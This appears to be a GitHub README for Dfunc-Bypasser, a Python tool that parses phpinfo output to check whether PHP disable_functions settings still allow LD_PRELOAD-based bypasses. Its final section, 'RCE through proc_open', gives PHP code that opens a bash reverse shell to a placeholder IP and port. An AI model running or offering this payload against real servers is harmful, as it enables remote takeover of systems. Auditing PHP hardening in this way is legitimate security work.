<p align="center"><img src="images/banner.png" /></p>

# Dfunc-Bypasser
This is a tool that can be used by developers to check if exploitation using LD_PRELOAD is still possible given the current disable_functions in the php.ini file and taking into consideration the PHP modules installed on the server.

## Installation
`git clone https://github.com/UsifAraby/dfunc-bypasser-python3.git`

## Usage
There are two options to input the disable_functions list:
1. For help on the parameters:
`python3 dfunc-bypasser-python3.py -h`
2. Provide the phpinfo url:
`python3 dfunc-bypasser-python3.py --url https://example.com/phpinfo.php`
3. Provide the local phpinfo file:
`python3 dfunc-bypasser-python3.py --file dir/phpinfo`
4. Provide an additional header:
`python3 dfunc-bypasser-python3.py -H "Special-Header: dev"`

## Contributers
1. S Ashwin Shenoi
    * Github: [ashwinshenoi99](https://github.com/ashwinshenoi99)
    * Twitter: [c3rb3ru5](https://twitter.com/__c3rb3ru5__)
2. Tarunkant Gupta
    * Github: [tarunkant](https://github.com/tarunkant/)
    * Twitter: [TarunkantG](https://twitter.com/TarunkantG)

from team [bi0s](https://bi0s.in)

## Screenshots

<img width="1112" height="593" alt="Screenshot 2025-09-22 010101" src="https://github.com/user-attachments/assets/3055c74d-f374-471a-b66a-b1a83c05c591" />

## RCE through `proc_open` :

```
<?php
// Vulnerable PHP versions: 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

$command = "bash -c 'bash -i >& /dev/tcp/{Custom_IP}/{Custom_PORT} 0>&1'";
$descriptors = [
  0 => ['pipe','r'],
  1 => ['pipe','w'],
  2 => ['pipe','w']
];
$process = proc_open($command, $descriptors, $pipes);
if (is_resource($process)) {
    echo stream_get_contents($pipes[1]);
    proc_close($process);
} else {
    echo "proc_open failed\n";
}

?>
```

<img width="1878" height="891" alt="image" src="https://github.com/user-attachments/assets/ea05cfe4-3f7c-4601-b4b5-d7454c82b651" />



